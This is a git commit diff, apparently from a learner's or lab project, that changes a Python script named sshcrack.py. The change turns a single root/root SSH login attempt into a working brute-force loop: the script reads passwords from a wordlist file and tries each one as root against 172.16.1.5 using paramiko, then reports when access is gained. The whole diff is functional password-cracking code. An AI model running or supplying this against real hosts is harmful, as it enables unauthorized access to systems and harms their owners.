20692c6d330077b4ccc66211e2f8e5f535aaeda8
João Carlos <joaoc.avils@gmail.com>
2022-10-25 10:35:37 -0300

    Lendo senhas da wordlist

--- sshcrack.py
+++ sshcrack.py
@@ -8,11 +8,18 @@ ssh.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)
 
 ssh.load_system_host_keys()
 
-try:
-	ssh.connect(hostname = '172.16.1.5', username='root', password='root')
+wordlist = open('wl.txt')
 
-except paramiko.ssh_exception.AuthenticationException:
-	print('Testando a senha root')
+for password in wordlist.readlines():
+	password = password.strip()
 
-else:
-	print('[+] Acesso Garantido => root')
+	try:
+		ssh.connect(hostname = '172.16.1.5', username='root', password=password)
+
+	except paramiko.ssh_exception.AuthenticationException:
+		print('Testando a senha => ', password)
+
+	else:
+		print('[+] Acesso Garantido => ', password)
+		break
+ssh.close()
